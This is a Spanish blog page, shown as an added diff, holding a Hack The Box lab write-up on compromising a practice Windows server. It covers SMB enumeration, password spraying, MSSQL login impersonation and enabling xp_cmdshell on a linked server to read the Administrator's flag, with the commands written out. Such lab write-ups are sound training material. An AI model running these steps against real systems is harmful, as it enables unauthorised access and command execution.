@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head><title>
+    
+    Laboratorio De Ataques a Servicios Comunes - Díficil | 
+    
+    CHL Blog
+</title>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<link rel="canonical" href="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-ataques-a-servicios-comunes---d%C3%ADficil/" />
+<link rel="icon" type="image/png" href="https://chlorenzo.com/image/favicon.ico">
+
+
+<meta name="description" content="
+    Este laboratorio analizamos servicios comunes expuestos, como SMB y MSSQL. A través de enumeración, logramos acceder a un servidor enlazado y ejecutar comandos con privilegios de administrador. El ejercicio pone en práctica el abuso de credenciales, impersonation en MSSQL, y el uso de xp_cmdshell para ejecutar comandos en el servidor.
+    "
+/>
+<meta property="og:description" content="
+    Este laboratorio analizamos servicios comunes expuestos, como SMB y MSSQL. A través de enumeración, logramos acceder a un servidor enlazado y ejecutar comandos con privilegios de administrador. El ejercicio pone en práctica el abuso de credenciales, impersonation en MSSQL, y el uso de xp_cmdshell para ejecutar comandos en el servidor.
+    " 
+/>
+
+
+
+
+<meta property="og:title" content="Laboratorio de Ataques a Servicios Comunes - Díficil" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-ataques-a-servicios-comunes---d%C3%ADficil/" /><meta property="article:section" content="pagina_web" />
+<meta property="article:published_time" content="2025-06-20T00:00:00+00:00" />
+<meta property="article:modified_time" content="2025-06-20T00:00:00+00:00" />
+
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Laboratorio de Ataques a Servicios Comunes - Díficil">
+  <meta name="twitter:description" content="Este laboratorio analizamos servicios comunes expuestos, como SMB y MSSQL. A través de enumeración, logramos acceder a un servidor enlazado y ejecutar comandos con privilegios de administrador. El ejercicio pone en práctica el abuso de credenciales, impersonation en MSSQL, y el uso de xp_cmdshell para ejecutar comandos en el servidor.">
+
+
+  <meta itemprop="name" content="Laboratorio de Ataques a Servicios Comunes - Díficil">
+  <meta itemprop="description" content="Este laboratorio analizamos servicios comunes expuestos, como SMB y MSSQL. A través de enumeración, logramos acceder a un servidor enlazado y ejecutar comandos con privilegios de administrador. El ejercicio pone en práctica el abuso de credenciales, impersonation en MSSQL, y el uso de xp_cmdshell para ejecutar comandos en el servidor.">
+  <meta itemprop="datePublished" content="2025-06-20T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-06-20T00:00:00+00:00">
+  <meta itemprop="wordCount" content="450">
+  <meta itemprop="keywords" content="Hackthebox,SMB,Mssql,Xp_cmdshell,Fuerza-Bruta,Enumeración">
+
+
+
+
+<link rel="stylesheet" href="https://chlorenzo.com/main.min.css">
+
+
+
+
+
+<script src="https://chlorenzo.com/bundle.js"></script>
+
+
+
+
+
+
+
+<script data-ad-client="adsense-key" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-4G9W14SLG4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4G9W14SLG4');
+</script>
+
+
+
+
+
+
+</head>
+
+<body><header id="header">
+  <div class="top-bar">
+    <div class="container-md">
+
+      <div class="row align-items-center">
+        <div class="col-3 col-sm-4 social-buttons d-none d-sm-block">
+          <ul>
+    
+    
+
+    
+    <li>
+        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
+            <i class="fab fa-youtube"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://www.instagram.com/19chl96/" target="_blank">
+            <i class="fab fa-instagram"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://github.com/chernadez321" target="_blank">
+            <i class="fab fa-github"></i></a>
+    </li>
+    
+
+    
+
+    
+    <li>
+        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
+            <i class="fab fa-linkedin"></i></a>
+    </li>
+    
+
+</ul>
+        </div>
+
+        <div class="ra-toggler col-3 col-sm-4 d-block d-sm-none">
+          <button class="bg-dark" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+            <i class="fas fa-bars"></i>
+          </button>
+        </div>
+
+        <div class="col-6 col-sm-4">
+          <h2 class="title"><a href="https://chlorenzo.com/">CHL Blog</a></h2>
+        </div>
+
+        
+        <div class="col-3 col-sm-4">
+          <div class="col col-md-8 offset-md-4 d-none d-sm-block">
+            <form id="cse-search-box-form-id" class="input-group search-bar" onsubmit="return executeQuery('lg');"
+              role="search">
+              <input id="cse-search-input-box-id" type="text" class="form-control" placeholder="Search">
+              <button class="btn" type="submit">
+                <i class="fa fa-search"></i>
+              </button>
+            </form>
+          </div>
+        </div>
+        
+
+      </div>
+    </div>
+  </div>
+
+  <div class="container-md">
+    <nav class="navbar navbar-expand-sm navbar-dark bg-dark sticky-top">
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav mx-auto">
+
+          <li class="nav-item d-block d-sm-none">
+            <ul class="social-buttons">
+              <ul>
+    
+    
+
+    
+    <li>
+        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
+            <i class="fab fa-youtube"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://www.instagram.com/19chl96/" target="_blank">
+            <i class="fab fa-instagram"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://github.com/chernadez321" target="_blank">
+            <i class="fab fa-github"></i></a>
+    </li>
+    
+
+    
+
+    
+    <li>
+        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
+            <i class="fab fa-linkedin"></i></a>
+    </li>
+    
+
+</ul>
+            </ul>
+          </li>
+
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://chlorenzo.com/">
+              Home
+            </a>
+          </li>
+          
+          
+          
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown">
+              Blog
+            </a>
+            <div class="dropdown-menu">
+              
+              
+                <a class="dropdown-item" href="https://chlorenzo.com/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
+              
+              
+              
+                <a class="dropdown-item" href="https://chlorenzo.com/pagina_web/blog/write-ups/">Write-ups</a>
+              
+              
+              
+                <div class="dropdown-divider"></div>
+              
+              
+              
+                <a class="dropdown-item" href="https://chlorenzo.com/tags/">Búsqueda por etiquetas</a>
+              
+              
+            </div>
+          </li>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://chlorenzo.com/pagina_web/trayectoria/">
+              Trayectoria
+            </a>
+          </li>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://chlorenzo.com/pagina_web/contact/">
+              Contacto
+            </a>
+          </li>
+          
+          
+        </ul>
+
+        
+        <form id="cse-search-box-form-id2" class="d-flex search-bar d-block d-sm-none"
+          onsubmit="return executeQuery('xs');" role="search">
+          <input id="cse-search-input-box-id2" type="text" class="form-control" placeholder="Search">
+          <button class="btn" type="submit">
+            <i class="fa fa-search"></i>
+          </button>
+        </form>
+        
+
+      </div>
+    </nav>
+  </div>
+</header>
+
+<main class="blog-content">
+    <div class="container-md">
+        <div class="row">
+            
+            <div class="col-lg-2 d-none d-xl-block">
+                <div class="ad-left-offset"></div>
+                
+            </div>
+
+            <div class="col-md-12 col-lg-8 px-lg-4">
+                
+
+                <h1 class="title">Laboratorio de Ataques a Servicios Comunes - Díficil</h1>
+
+                <div class="container-fluid px-0 mb-4">
+                    <div class="row align-items-end">
+                        <div class="col-md-4 date-time">
+                            <span class="date">
+    Jun 20, 2025
+</span>
+                            &centerdot;
+                            <span class="time-to-read">
+    3 mins read</span>
+                        </div>
+
+                        <div class="col-md-8 tags ">
+                            
+                            <a href="https://chlorenzo.com/tags/hackthebox"><span
+                                    class="tag bg-dark">hackthebox</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/smb"><span
+                                    class="tag bg-dark">smb</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/mssql"><span
+                                    class="tag bg-dark">mssql</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/xp_cmdshell"><span
+                                    class="tag bg-dark">xp_cmdshell</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/fuerza-bruta"><span
+                                    class="tag bg-dark">fuerza-bruta</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/enumeraci%C3%B3n"><span
+                                    class="tag bg-dark">enumeración</span></a>
+                            
+                        </div>
+                    </div>
+                </div>
+
+                
+
+                <h4 id="enunciado">Enunciado</h4>
+<p>El tercer servidor es otro servidor interno que se utiliza para gestionar archivos y material de trabajo, como formularios. Además, se utiliza una base de datos en el servidor, cuya finalidad desconocemos.</p>
+<h4 id="enumeración-de-puertos"><strong>Enumeración de puertos</strong></h4>
+<p>Iniciamos la enumeración de servicios para identificar los puertos y protocolos activos en la máquina objetivo. Este escaneo se va a demorar un poco.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sS -p- --min-rate <span style="color:#ae81ff">1000</span> -n -Pn &lt;IP&gt;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/common_services_htb_labs_3/nmap1.png" alt="">
+Vemos que tenemos los puertos 135, 445, 1433 y 3398 abiertos, vamos a recoger más información de los servicios que hay corriendo en cada puerto.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p135,445,1433,3389 -n -Pn &lt;IP&gt;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/common_services_htb_labs_3/nmap2.png" alt="">
+<img src="../../../../../images/HTB_modulos/common_services_htb_labs_3/nmap3.png" alt=""></p>
+<p>Vemos con la información que tenemos que es un servidor Windows, estan corriendo un smb por el puerto 445, una base de datos Microsoft por el 1433 y un rdp por el 3389. Vamos a empezar por el 445 dado que no tenemos credenciales ni nada para intentar acceder a los otros servicios y vemos lo siguiente.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -L //&lt;IP&gt;/ -N 
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/common_services_htb_labs_3/smb1.png" alt="">
+Vemos un Directorio Home al cual nos conectamos anónimo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient //10.129.203.10/Home -N
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/common_services_htb_labs_3/smb2.png" alt="">
+Donde hay varias carpetas y archivos accedemos y descargamos todos los recursos para mirarlos en local.
+Y vemos que los archivos creds, secret y random son posibles contraseñas. Recordemos que vimos recién carpetas de posibles usuarios con <code>Fiona</code>, <code>John</code> y <code>Simon</code>.</p>
+<p><img src="../../../../../images/HTB_modulos/common_services_htb_labs_3/smb3.png" alt=""></p>
+<p>Hacemos un poco de fuerza bruta con uno de los servicios que tenemos expuestos para capturar la siguiente flag que son las credenciales de fiona:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 10.129.203.10 -u fiona -p creds.txt
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/common_services_htb_labs_3/smb4.png" alt=""></p>
+<p>Ahora que tenemos credenciales válidas intentamos acceder a alguno de los servicios que tenemos alcance y vemos que en la BD podemos entrar:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 /.../python3-impacket/examples/mssqlclient.py fiona@&lt;IP&gt; -windows-auth
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/common_services_htb_labs_3/mssql1.png" alt=""></p>
+<p>Estamos dentro de la Base de datos y vamos a guiarnos por las pistas que nos dieron anteriormente de revisar la base de datos, ver los servidores de enlace y simular la <code>impersonation</code>.
+Intentamos con el usuario <code>fiona</code> acceder al servidor local de enlace, pero me da que el usuario no tiene permisos. Entonces intentamos suplantar a los usuarios <code>jonn</code> o <code>simon</code>, vemos que simon no existe pero <code>john</code> si.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>EXECUTE AS LOGIN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;john&#39;</span>;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>SELECT SYSTEM_USER;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>SELECT IS_SRVROLEMEMBER<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;sysadmin&#39;</span><span style="color:#f92672">)</span>;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/common_services_htb_labs_3/mssql2.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">EXEC</span> sp_linkedservers;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/common_services_htb_labs_3/mssql3.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span>(<span style="color:#e6db74">&#39;SELECT SYSTEM_USER, IS_SRVROLEMEMBER(&#39;&#39;sysadmin&#39;&#39;)&#39;</span>) <span style="color:#66d9ef">AT</span> [<span style="color:#66d9ef">local</span>.test.linked.srv];
+</span></span></code></pre></div><p>Vemos que este usuario pertenece al grupo <code>sysadmin</code> dentro del servidor de enlace local.
+<img src="../../../../../images/HTB_modulos/common_services_htb_labs_3/mssql4.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span>(<span style="color:#e6db74">&#39;sp_configure &#39;&#39;show advanced options&#39;&#39;, 1; RECONFIGURE;&#39;</span>) <span style="color:#66d9ef">AT</span> [<span style="color:#66d9ef">local</span>.test.linked.srv];<span style="color:#66d9ef">EXECUTE</span>(<span style="color:#e6db74">&#39;sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1; RECONFIGURE;&#39;</span>) <span style="color:#66d9ef">AT</span> [<span style="color:#66d9ef">local</span>.test.linked.srv];
+</span></span></code></pre></div><p>Habilitamos la función xp_cmdshell para poder ejecutar comandos en el servidor.</p>
+<p><img src="../../../../../images/HTB_modulos/common_services_htb_labs_3/mssql5.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">EXECUTE</span>(<span style="color:#e6db74">&#39;EXEC xp_cmdshell &#39;&#39;dir &#34;C:\Users\Administrator\Desktop&#34;&#39;&#39;&#39;</span>) <span style="color:#66d9ef">AT</span> [<span style="color:#66d9ef">local</span>.test.linked.srv];
+</span></span></code></pre></div><p>Listamos el escritorio del usuario <code>Administrator</code> y vemos la flag.</p>
+<p><img src="../../../../../images/HTB_modulos/common_services_htb_labs_3/mssql6.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>EXECUTE<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;EXEC xp_cmdshell &#39;&#39;type &#34;C:\Users\Administrator\Desktop\flag.txt&#34;&#39;&#39;&#39;</span><span style="color:#f92672">)</span> AT <span style="color:#f92672">[</span>local.test.linked.srv<span style="color:#f92672">]</span>;
+</span></span></code></pre></div><p>Leemos el archivo</p>
+<p><img src="../../../../../images/HTB_modulos/common_services_htb_labs_3/mssql7.png" alt=""></p>
+<p>Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.</p>
+
+
+                <div id="social-media-share">
+	<p><i>Escríbeme por cualquiera de las vías</i></p>
+	
+	<div class="share-buttons">
+	    
+		<a href="https://www.instagram.com/19chl96/" 
+   			target="_blank" 
+   			title="Sígueme en Instagram">
+    		<img src=https://chlorenzo.com/icons/45px/instagram.png alt="Instagram">
+		</a>
+
+		<a  href="https://www.linkedin.com/in/chlinked/"
+	        onclick="socialMediaPopUp(this.href, '', 900, 500); return false;"
+	        title="Share on LinkedIn. Opens in a new window." >
+	        <img src=https://chlorenzo.com/icons/48px/linkedin.png>
+	    </a>
+
+	    <a href="https://mail.google.com/mail/?view=cm&fs=1&to=chlorenzo96@gmail.com&su=Para Carlos&body=Hola." 
+   		   target="_blank" 
+   		   title="Enviar correo usando Gmail">
+    	<img src=https://chlorenzo.com/icons/48px/email.png alt="Email">
+		</a>
+
+		
+
+	</div>
+</div>
+
+
+
+                
+                <br>
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    (function () {
+        
+        
+        if (window.location.hostname == "localhost")
+            return;
+
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = '';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+            </div>
+
+            <div class="col-lg-2 d-none d-xl-block">
+                <div class="ad-right-offset"></div>
+                
+            </div>
+        </div>
+    </div>
+</main>
+
+<footer class="bg-dark text-light py-4">
+    <div class="container-md">
+        <div class="row justify-content-center">
+            <div class="col-12">
+                <nav class="navbar navbar-expand-sm navbar-dark bg-dark justify-content-center">
+                    <ul class="navbar-nav">
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://chlorenzo.com/">Home</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://chlorenzo.com/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://chlorenzo.com/pagina_web/blog/write-ups/">Write-ups</a>
+                        </li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </div>
+    <div class="text-center mt-3">
+        <p>© 2025 Carlos Hernández Lorenzo</p>
+    </div>
+</footer>
+
+
+<script async src="https://cse.google.com/cse.js?cx=google-cse-key"></script>
+<gcse:searchresults-only></gcse:searchresults-only>
+
+</body>
+
+</html>
